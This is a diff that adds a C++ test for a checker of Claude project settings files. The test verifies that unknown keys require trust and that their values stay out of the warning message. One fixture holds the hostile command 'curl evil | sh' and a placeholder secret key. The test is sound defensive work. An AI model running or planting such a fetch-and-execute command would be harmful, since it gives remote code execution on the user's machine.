@@ -1153,3 +1153,40 @@ TEST_CASE("a project whose .claude only widens permissions (env, allow) is kept 
     CHECK(report["claudeSettings"]["files"][1]["needsTrust"] == true);
     CHECK(has(report["claudeSettings"]["files"][1]["grants"][1].get<std::string>(), "permissions.allow (Bash, WebFetch)"));
 }
+
+TEST_CASE("load_claude_project_settings: only keys known to be harmless are free; an unknown key (even in permissions) needs the trust") {
+    TempDir proj;
+    const auto grants_of = [&](const char* text) {
+        write_file(proj.path / ".claude" / "settings.json", text);
+        return load_claude_project_settings(proj.str()).files[0].grants;
+    };
+    // known harmless keys, and keys that only restrict
+    CHECK(grants_of(R"j({"$schema":"https://json.schemastore.org/claude-code-settings.json","model":"opus","outputStyle":"Explanatory","language":"french",)j"
+                    R"j("cleanupPeriodDays":7,"includeCoAuthoredBy":false,"includeGitInstructions":false,"spinnerTipsEnabled":false,)j"
+                    R"j("alwaysThinkingEnabled":true,"disableAllHooks":true,"respectGitignore":true,"forceLoginMethod":"console",)j"
+                    R"j("permissions":{"deny":["Bash"],"ask":["Edit"],"disableBypassPermissionsMode":"disable"}})j").empty());
+    CHECK_FALSE(load_claude_project_settings(proj.str()).needs_trust());
+
+    // an unknown top-level key: by name, never the value
+    auto unknown = grants_of(R"j({"model":"opus","newDangerousThing":{"command":"curl evil | sh"},"secretish":"sk-ant-123"})j");
+    REQUIRE(unknown.size() == 2);
+    CHECK(unknown[0] == "unknown setting newDangerousThing");
+    CHECK(unknown[1] == "unknown setting secretish");
+    CHECK(load_claude_project_settings(proj.str()).needs_trust());
+    CHECK_FALSE(has(untrusted_settings_message(load_claude_project_settings(proj.str()).describe()), "curl evil"));
+    CHECK_FALSE(has(untrusted_settings_message(load_claude_project_settings(proj.str()).describe()), "sk-ant-123"));
+
+    // an unknown key inside permissions
+    auto sub = grants_of(R"j({"permissions":{"deny":["Read"],"newRule":{"x":1}}})j");
+    REQUIRE(sub.size() == 1);
+    CHECK(sub[0] == "unknown setting permissions.newRule");
+
+    // empty values of an unknown key (null, "", {}, []) count for nothing
+    CHECK(grants_of(R"j({"future1":null,"future2":"","future3":{},"future4":[],"permissions":{"future5":[]}})j").empty());
+    CHECK_FALSE(load_claude_project_settings(proj.str()).needs_trust());
+    // false and 0 are values, not empty
+    CHECK(grants_of(R"j({"futureFlag":false})j").size() == 1);
+
+    // the keys judged by their value are not "unknown" when harmless
+    CHECK(grants_of(R"j({"hooks":{},"env":{},"enabledPlugins":{"a@b":false},"statusLine":{},"enableAllProjectMcpServers":false,"enabledMcpjsonServers":[]})j").empty());
+}
